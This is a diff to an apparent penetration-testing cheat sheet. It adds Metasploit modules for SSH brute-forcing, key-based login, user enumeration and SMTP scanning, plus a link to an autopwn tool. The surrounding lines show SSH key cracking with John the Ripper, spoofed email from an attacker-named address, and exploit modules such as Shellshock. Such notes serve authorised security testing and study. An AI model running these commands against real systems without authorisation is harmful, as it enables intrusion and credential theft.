@@ -326,11 +326,12 @@ ssh2john id_rsa > id_rsa.john
 john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
 ```
 
-
+**Metasploit Modules**
 ```
-auxiliary/scanner/ssh/ssh_version
-auxiliary/scanner/ssh/ssh_login
-auxiliary/scanner/ssh/ssh_enumusers
+use auxiliary/scanner/ssh/ssh_version
+use auxiliary/scanner/ssh/ssh_login          # for username:password bruteforcing
+use auxiliary/scanner/ssh/ssh_login_pubkey   # for pub_key:pvt_key login
+use auxiliary/scanner/ssh/ssh_enumusers
 ```
 
 
@@ -398,6 +399,7 @@ sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s $TG -u "Subject:IMP" 
 Enumerating SMTP users
 ```
 smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t $TG
+msf6> use auxiliary/scanner/smtp/smtp_version
 msf6> use auxiliary/scanner/smtp/smtp_enum
 ```
 
@@ -704,6 +706,7 @@ services
 vulns
 loot
 creds
+analyze
 ```
 
 Setting RHOSTS
@@ -856,7 +859,7 @@ msf > use exploit/multi/http/apache_mod_cgi_bash_env_exec
 msf > use exploit/windows/misc/hta_server
 ```
 
-
+`autopwn` [here](https://github.com/hahwul/metasploit-autopwn)
 
 #### Very Handy Links ;)
 
